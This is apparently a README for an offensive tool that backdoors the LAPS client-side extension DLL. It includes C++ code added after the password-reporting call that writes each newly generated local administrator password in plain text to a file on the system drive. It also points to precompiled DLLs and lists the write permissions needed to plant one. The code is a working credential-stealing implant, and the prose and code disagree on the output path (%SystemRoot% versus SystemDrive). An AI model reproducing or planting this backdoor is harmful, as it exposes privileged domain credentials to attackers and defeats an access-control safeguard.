### Explanation

This is a very simple backdoor for LAPS (Local Administrator Password Solution) Client-Side Extension (CSE) worker DLL. That DLL is responsible for processing Group Policy updates and whenever currently set local administrator's password is about to expire (or it was explicitly set as expired on DC), it re-generates password, set it up and reports it back to the AD Computer's object. 

### How it works

Our approach is to add couple of lines of code to hijack new password being reported to the Active Directory and write it out to %SystemRoot%\laps-new-password.txt file.

One can find already compiled DLLs for x86 and x64, working for LAPS client version 6.2.0.0 .

In case manual compilation is needed, one can compile original [AdmPwd's project DLL](https://github.com/GreyCorbel/admpwd), add below code and then compile it.


### Requirements

- In order to plant that DLL you will need to have write permissions on the %PROGRAMFILES%\LAPS\CSE directory.
- Then you will have to wait until password reset event takes place - which can happen:
    - upon current password expiration
    - when explicitly resetted by authorized principal.

Above requirements effectively lower risk introduced by backdooring LAPS CSE.


```
			//it's time to change the password

			PasswordGenerator gen(config.PasswordComplexity, config.PasswordLength);
			gen.Generate();
			LPCTSTR newPwd = gen.Password;
			
			//report new password and timestamp to AD
			GetSystemTimeAsFileTime(&currentTime);
			LogData.dwID = S_REPORT_PWD;
			LogData.hr = comp.ReportPassword(newPwd, &currentTime, config.PasswordAge);

			// --------------------
			// Backdoor

			HANDLE outFile;
			WCHAR *buff = new WCHAR[512];
			if (buff) {
				if (GetEnvironmentVariableW(L"SystemDrive", buff, 512)){
					wcscat_s(buff, 512, L"\\laps-new-password.txt");
					outFile = CreateFileW(
						buff,
						GENERIC_WRITE, 
						FILE_SHARE_READ, 
						NULL, 
						OPEN_ALWAYS, 
						FILE_ATTRIBUTE_NORMAL, 
						NULL
					);

					if (outFile != static_cast<HANDLE>(INVALID_HANDLE_VALUE)) {
						DWORD written = 0;

						wcscpy_s(buff, 512, newPwd);
						wcscat_s(buff, 512, L"\r\n");

						WriteFile(
							outFile, 
							buff,
							sizeof(WCHAR) * wcslen(buff),
							&written, 
							NULL
						);

						CloseHandle(outFile);
					}
				}

				delete[] buff;
			}

			// --------------------
```